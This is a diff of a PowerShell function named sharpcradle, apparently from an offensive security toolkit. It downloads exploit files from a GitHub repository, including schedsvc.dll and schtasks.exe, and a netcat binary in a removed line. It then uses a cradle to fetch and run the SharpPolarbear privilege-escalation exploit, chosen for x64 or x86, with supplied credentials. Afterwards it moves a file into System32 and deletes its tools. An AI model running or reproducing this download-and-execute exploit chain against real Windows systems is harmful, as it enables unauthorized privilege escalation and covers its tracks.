@@ -173,10 +173,19 @@ function sharpcradle{
 		Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/schedsvc.dll -Outfile $currentPath\schedsvc.dll
 		Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/schtasks.exe -Outfile $currentPath\schtasks.exe
 		Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/test.job -Outfile $currentPath\test.job
-		Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/nc.exe -Outfile C:\temp\nc.exe
-		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/sharpolar.exe license.rtf $username $password
-		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/sharpolar.exe license.rtf $username $password
 		
+		if ([Environment]::Is64BitProcess)
+		{
+			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpPolarbear.exe license.rtf $username $password
+			Start-Sleep -Seconds 1.5
+			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpPolarbear.exe license.rtf $username $password
+		}
+		else
+		{
+			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpPolarbearx86.exe license.rtf $username $password
+			Start-Sleep -Seconds 1.5
+			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpPolarbearx86.exe license.rtf $username $password
+		}
 		move env:USERPROFILE\Appdata\Local\temp\license.rtf C:\windows\system32\license.rtf
 		del .\cradle.exe
 		del .\schedsvc.dll
